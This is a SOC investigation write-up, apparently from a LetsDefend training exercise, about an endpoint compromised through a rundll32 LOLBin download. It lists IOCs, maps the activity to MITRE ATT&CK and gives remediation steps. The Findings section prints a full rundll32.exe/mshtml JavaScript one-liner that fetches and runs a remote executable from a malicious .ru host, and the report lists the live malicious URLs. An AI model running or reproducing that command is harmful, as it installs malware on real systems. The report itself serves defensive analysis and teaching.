# SOC Investigation Report — Suspicious URL Access from Compromised Endpoint

---

**Information:**

| Field | Detail |
|---|---|
| Event Time | 2021 (Exact date from SIEM alert) |
| Severity | Critical |
| Rule | Suspicious Web Request Detected |

---

## Executive Summary

A SIEM alert flagged a suspicious outbound web request from an internal endpoint to a known malicious Russian-hosted domain. Investigation revealed the endpoint had been compromised — terminal history showed a `rundll32.exe` command designed to download and execute malware from a remote server. The endpoint had not been logged into since 2020, indicating unauthorized access. The malicious URL was confirmed by VirusTotal with 13 vendor detections. The system was immediately contained via EDR and the incident was escalated to Tier 2 for full forensic analysis.

---

## Alert Details

| Field | Detail |
|---|---|
| Rule Triggered | Suspicious Web Request Detected |
| Log Source | Network logs, EDR telemetry |
| Source Address | 172.16.17.49 (Internal endpoint — compromised) |
| Destination Address | 91.189.114.8 (External — malicious) |
| User Agent | Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36 |
| Suspicious URL | `http://mogagrocol.ru/wp-content/plugins/akismet/fv/index.php?email=ellie@letsdefend.io` |
| Malware Delivery URL | `http://ru-uid-507352920.pp.ru/KBDYAK.exe` (flagged by 13/91 VirusTotal vendors) |
| Status | Closed — Contained and Escalated to Tier 2 |

---

## Investigation Timeline

| Timestamp (UTC) | Action |
|---|---|
| T+0:00 | Alert triggered — suspicious outbound web request from internal endpoint 172.16.17.49 to external IP 91.189.114.8 |
| T+0:02 | Initial triage — reviewed source and destination IPs in network logs; identified the suspicious request to `mogagrocol.ru` |
| T+0:04 | Analyzed the URL structure — `.ru` domain commonly associated with malware campaigns; request routed through a WordPress plugin path (`wp-content/plugins/akismet/`) atypical of legitimate Akismet usage; query parameter passing a victim email address (`ellie@letsdefend.io`) suggests credential harvesting or phishing infrastructure |
| T+0:06 | Confirmed the destination IP is not a company asset — pivoted to investigate the source endpoint (172.16.17.49) |
| T+0:08 | Inspected the source endpoint via EDR — reviewed processes, network activity, browser history, and terminal activity |
| T+0:10 | Discovered a highly malicious command in terminal history: `rundll32.exe` abused to execute JavaScript that downloads a remote executable (`KBDYAK.exe`) from `ru-uid-507352920.pp.ru` — a known malware delivery technique |
| T+0:12 | Noted the endpoint had not been logged into since 2020, yet the malicious activity occurred in 2021 — strong indicator of unauthorized remote access |
| T+0:13 | Submitted the malware delivery URL to VirusTotal — flagged by 13/91 security vendors as malicious |
| T+0:14 | Contained the endpoint via EDR — isolated from the network to prevent further C2 communication or lateral movement |
| T+0:15 | Escalated to Tier 2 for full forensic investigation, malware analysis, and remediation |

---

## Findings

The internal endpoint (172.16.17.49) has been compromised. Investigation uncovered two key indicators of malicious activity:

**1. Malicious Outbound Request**
The endpoint made an HTTP request to `mogagrocol.ru`, a Russian-hosted domain leveraging a WordPress plugin directory structure to disguise phishing or data exfiltration infrastructure. The URL passed a victim email address (`ellie@letsdefend.io`) as a query parameter, suggesting credential harvesting or victim tracking.

**2. Malware Download via rundll32 Abuse**
Terminal history revealed the following command:

```
rundll32.exe javascript:'../mshtml,RunHTMLApplication ';document.write();GetObject('script:http://ru-uid-507352920.pp.ru/KBDYAK.exe')
```

This is a well-documented Living-off-the-Land (LOLBin) technique that abuses `rundll32.exe` to execute JavaScript and download a remote executable. The delivery URL was confirmed malicious by 13 VirusTotal vendors. The endpoint had no legitimate user login since 2020, confirming unauthorized access.

---

## MITRE ATT&CK Mapping

| Technique | ID | Description |
|---|---|---|
| System Binary Proxy Execution: Rundll32 | T1218.011 | Attacker abused `rundll32.exe` to execute JavaScript and download malware, bypassing application controls |
| Ingress Tool Transfer | T1105 | Remote executable (`KBDYAK.exe`) downloaded from an external malicious server |
| Phishing | T1566 | Suspicious URL passing victim email to likely phishing/credential harvesting infrastructure |
| Command and Scripting Interpreter: JavaScript | T1059.007 | JavaScript executed via `rundll32.exe` to initiate malware download |
| Application Layer Protocol: Web Protocols | T1071.001 | Malware and C2 communication conducted over HTTP |

---

## Verdict

**True Positive** — Confirmed compromise. An attacker gained unauthorized access to an internal endpoint, executed a malware download via `rundll32.exe` abuse, and established communication with malicious Russian-hosted infrastructure. The endpoint was contained and escalated.

---

## Response Actions Taken

- Contained the compromised endpoint (172.16.17.49) via EDR — full network isolation applied
- Documented all malicious URLs, commands, and indicators of compromise
- Escalated to Tier 2 for forensic analysis, malware reverse engineering, and full remediation

---

## Recommendations

- **Block malicious domains and IPs** — Add `mogagrocol.ru`, `ru-uid-507352920.pp.ru`, and 91.189.114.8 to firewall deny lists, DNS sinkholes, and proxy blocklists
- **Hash and file blocklisting** — Obtain the hash of `KBDYAK.exe` and add it to endpoint protection blocklists across the environment
- **Environment-wide hunt** — Search all endpoints for the same `rundll32.exe` JavaScript execution pattern, connections to the identified domains, and the `KBDYAK.exe` file hash
- **Credential reset** — Reset credentials for `ellie@letsdefend.io` and any other accounts associated with the compromised endpoint, as credentials may have been harvested
- **Audit dormant systems** — Identify and review all endpoints with no recent user login activity — dormant systems are attractive targets for unauthorized access
- **Restrict LOLBin abuse** — Implement application control policies or detection rules to alert on `rundll32.exe` being used to execute JavaScript or download remote content
- **Full forensic imaging** — Image the compromised endpoint before remediation to preserve evidence for further analysis

---

## Indicators of Compromise (IOCs)

| Type | Value |
|---|---|
| IP Address | 91.189.114.8 |
| Domain | mogagrocol.ru |
| Domain | ru-uid-507352920.pp.ru |
| URL | `http://mogagrocol.ru/wp-content/plugins/akismet/fv/index.php?email=ellie@letsdefend.io` |
| URL | `http://ru-uid-507352920.pp.ru/KBDYAK.exe` |
| Filename | KBDYAK.exe |
| Internal IP | 172.16.17.49 (Compromised) |

---

## References

- VirusTotal analysis — `ru-uid-507352920.pp.ru/KBDYAK.exe` (13/91 vendors)
- EDR telemetry — Terminal history, process activity on 172.16.17.49
- Network logs — Outbound HTTP request to mogagrocol.ru
- MITRE ATT&CK: [T1218.011 — Rundll32](https://attack.mitre.org/techniques/T1218/011/)
- MITRE ATT&CK: [T1105 — Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/)
- MITRE ATT&CK: [T1566 — Phishing](https://attack.mitre.org/techniques/T1566/)
- MITRE ATT&CK: [T1059.007 — JavaScript](https://attack.mitre.org/techniques/T1059/007/)
- MITRE ATT&CK: [T1071.001 — Web Protocols](https://attack.mitre.org/techniques/T1071/001/)
